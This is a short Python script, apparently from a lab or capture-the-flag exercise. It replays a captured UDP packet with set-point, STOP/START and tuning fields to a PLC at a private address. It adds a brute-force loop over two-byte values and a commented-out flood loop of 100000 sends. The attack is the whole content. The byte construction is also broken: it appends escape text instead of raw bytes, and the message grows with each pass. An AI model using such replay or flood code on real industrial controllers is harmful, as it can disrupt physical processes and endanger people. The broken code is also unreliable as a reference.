import socket
import codecs


# .6 是 HMI .14 PLC


HOST = "10.4.0.14"
PORT = 18507
hexadecimal_string = codecs.decode(
    "0022e527fa28b496915bf91f0800450000ae6f6200008011b6c10a0400060a04000e484b484b009a90b5face00800002eb820001d050548004000a0100001244001006ef01ac00080000000a0004000a0018001a00200002002d0002002f00040031000a00320006004800000000006aadc80008004400430031002f00530050005f00440000000200430056000047000400530054004f00500000000000000100090053005500500045005200540055004e00450000124400013c0d", "hex_codec")
# byte_array = bytearray.fromhex(hexadecimal_string)
byte_array = hexadecimal_string
MESSAGE = byte_array

MESSAGE = b"\xfa\xce\x00\x82\x00\x02\xb2\x81\x00\x01\x96\xc9\x54\x80\x04\x00" \
    b"\x0a\x01\x00\x00\x12\x44\x00\x10\x08\xb2\x00\x88\x00\x08\x00\x00" \
    b"\x00\x0a\x00\x04\x00\x0a\x00\x18\x00\x1a\x00\x20\x00\x02\x00\x2f" \
    b"\x00\x02\x00\x31\x00\x04\x00\x33\x00\x0a\x00\x34\x00\x06\x00\x4a" \
    b"\x00\x00\x00\x00\x00\x8f\xad\xed\x00\x08\x00\x44\x00\x43\x00\x31" \
    b"\x00\x2f\x00\x53\x00\x50\x00\x5f\x00\x44\x00\x00\x00\x02\x00\x43" \
    b"\x00\x56\x00\x00\x47\x00\x05\x00\x53\x00\x54\x00\x41\x00\x52\x00" \
    b"\x54\x00\x00\x00\x00\x00\x00\x01\x00\x09\x00\x53\x00\x55\x00\x50" \
    b"\x00\x45\x00\x52\x00\x54\x00\x55\x00\x4e\x00\x45\x00\x00\x12\x44" \
    b"\x00\x01"\


for i in range(256):
    for j in range(256):
        t = ""
        if len(str(hex(i)[2:])) < 2:
            t = "\\x0"+str(hex(i)[2:])
        else:
            t = "\\x"+str(hex(i)[2:])
        if len(str(hex(j)[2:])) < 2:
            t += "\\x0"+str(hex(j)[2:])
        else:
            t += "\\x"+str(hex(j)[2:])

        MESSAGE = MESSAGE+bytes(t, encoding='utf8')
        print(type(MESSAGE))
        print(MESSAGE)
        print("")
        # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # sock.sendto(MESSAGE, (HOST, PORT))


print("UDP target IP:", HOST)
print("UDP target port:", PORT)
print("message:", MESSAGE)

# sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
# for i in range(100000):
#     sock.sendto(MESSAGE, (HOST, PORT))
